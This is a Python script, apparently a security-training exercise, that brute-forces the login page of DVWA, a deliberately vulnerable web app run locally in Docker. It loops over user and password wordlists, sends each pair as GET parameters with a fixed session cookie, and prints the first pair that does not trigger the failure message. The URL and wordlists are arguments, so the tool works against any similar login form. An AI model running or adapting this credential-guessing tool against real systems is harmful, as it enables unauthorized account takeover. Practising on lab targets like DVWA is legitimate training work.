# Tested on DVWA

# docker pull vulnerables/web-dvwa
# docker run --rm -p 8080:80 --name dvwa vulnerables/web-dvwa

# pip install pwntools

import requests
import argparse
from pwn import log
import sys

# url: http://localhost:8080/vulnerabilities/brute/?username=USER&password=PASSWD&Login=Login
def brute_force(url, wordlistUser, wordlistPasswd):
    # Session para mantener cookies
    # PHPSESSID es una cookie de sesión generada por el servidor PHP. Sirve para mantener una sesión persistente entre el cliente (navegador o script), y el servidor.
    session = requests.Session()

    cookies = {
        "security": "low",
        "PHPSESSID": "2g25mcoi7uo6kich3bnhu0esg1"
    }

    counter = 0
    user_bar = log.progress("Usuario")
    pass_bar = log.progress("Contraseña")

    try:
        with open(wordlistUser, 'rt', encoding='latin-1') as users_file:
            users = [user.strip() for user in users_file]
        
        with open(wordlistPasswd, 'rt', encoding='latin-1') as passwd_file:
            passwords = [passwd.strip() for passwd in passwd_file]
    except FileNotFoundError as err:
        log.error(f"Archivo no encontrado: {err}")
        sys.exit(1)
    
    for password in passwords:
        pass_bar.status(password)

        for user in users:
            # counter = counter + 1
            counter += 1
            user_bar.status(user)

            creds = {
                "username": user,
                "password": password,
                "Login": "Login"
            }

            try:
                r = session.get(url, params=creds, cookies=cookies)

                if "Username and/or password incorrect." not in r.text:
                    log.success(f"[+] Credenciales válidas encontradas en intento # {counter}:")
                    print(f"[+] Usuario: {user}")
                    print(f"[+] Contraseña: {password}")
                    return
            except requests.exceptions.RequestException as e:
                log.warning(f"[!] Error en red: {e}")
                continue
    
    pass_bar.failure("[-] No se encontraron credenciales válidas.")

if __name__ == "__main__":
    # Crea un objeto parser para manejar argumentos desde línea de comandos
    parser = argparse.ArgumentParser(description="Script de fuerza bruta DVWA")

    # Definir argumento obligatorio -u o --url
    parser.add_argument("-u", "--url", required=True, help="URL del login vulnerable")
    parser.add_argument("-L", "--users", required=True, help="Ruta al archivo de usuarios")
    parser.add_argument("-P", "--passwords", required=True, help="Ruta al archivo de contraseñas")

    args = parser.parse_args()

    brute_force(args.url, args.users, args.passwords)
